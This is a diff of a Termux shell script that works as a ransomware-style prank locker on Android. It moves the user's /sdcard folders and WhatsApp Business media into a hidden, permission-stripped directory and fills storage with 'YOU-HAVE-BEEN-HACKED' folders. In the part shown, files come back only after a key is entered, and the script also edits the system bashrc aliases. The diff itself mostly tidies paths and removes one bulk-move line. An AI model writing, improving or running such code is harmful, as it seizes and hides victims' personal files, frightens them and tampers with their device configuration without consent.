@@ -1,5 +1,4 @@
-mkdir /$HOME/.rfkzk
-find /sdcard -mindepth 1 -maxdepth 1 -type d ! -name 'Android' -exec mv -t /$HOME/.rfkzk {} +
+mkdir $HOME/.rfkzk
 if [ -d "/sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business'" ]
 then
 	mv /sdcard/Android/media/com.whatsapp.w4b/'WhatsApp Business' /data/data/com.termux/files/home/.rfkzk
@@ -35,7 +34,7 @@ else
         echo "nothingtodo"
         sleep 2
 fi
-chmod u=w /$HOME/.rfkzk
+chmod u=w $HOME/.rfkzk
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂y
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂t
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂r
@@ -89,7 +88,7 @@ do
 		else
 			echo "nothingtodo"
 		fi
-  	rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂y
+  		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂y
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂t
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂r
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂e
@@ -105,7 +104,7 @@ do
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂3
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂2
 		rmdir /sdcard/YOU-HAVE-BEEN-HACKED-😂1
-  	mv /$HOME/.rfkzk/* /sdcard/
+  		mv $HOME/.rfkzk/* /sdcard/
 		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
 		break
 	elif [ "$key" == "info" ]
